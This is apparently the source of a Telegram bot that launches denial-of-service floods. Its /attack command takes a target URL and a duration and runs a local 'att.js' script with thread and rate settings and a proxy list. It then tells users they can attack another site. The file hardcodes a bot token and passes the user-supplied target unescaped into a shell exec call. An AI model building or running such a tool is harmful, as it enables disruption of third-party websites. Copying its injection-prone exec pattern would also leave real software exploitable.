const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const { URL } = require('url'); // Import URL module for URL validation

// Telegram bot token
const token = '6303718232:AAGvJkQD7WYwiDnRPHaZ2M8CiD4_DBHWkew';
const bot = new TelegramBot(token, { polling: true });

// Function to check if a string is a valid URL
function isValidURL(url) {
    try {
        new URL(url);
        return true;
    } catch (error) {
        return false;
    }
}

// Countdown timer for 30 seconds
function countdownTimer(chatId) {
    bot.sendMessage(chatId, 'Countdown: 30 seconds');

    setTimeout(() => {
        bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
    }, 30000);
}

bot.onText(/\/attack (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1].split(' ');

    if (args.length === 1) {
        const command = 'node att.js';
        exec(command, (error, stdout, stderr) => {
            if (error) {
                bot.sendMessage(chatId, `Error occurred: ${error.message}`);
            } else {
                bot.sendMessage(chatId, '😈 ATTACK START 😈');
                countdownTimer(chatId);
            }
        });
    } else if (args.length === 2) {
        const target = args[0];
        const time = parseInt(args[1]);

        if (target === 'none') {
            bot.sendMessage(chatId, 'Please provide a valid URL');
            return;
        }

        if (!isValidURL(target)) {
            bot.sendMessage(chatId, 'Please provide a valid URL');
            return;
        }

        if (time < 10 || time > 60) {
            bot.sendMessage(chatId, 'Time must be between 10 and 60');
            return;
        }

        const command = `node att.js ${target} ${time} 64 10 proxy.txt`;
        exec(command, (error, stdout, stderr) => {
            if (error) {
                bot.sendMessage(chatId, `Error occurred: ${error.message}`);
            } else {
                bot.sendMessage(chatId, '😈 ATTACK START 😈');
                countdownTimer(chatId);
            }
        });
    } else {
        bot.sendMessage(chatId, 'Invalid command format');
    }
});
            
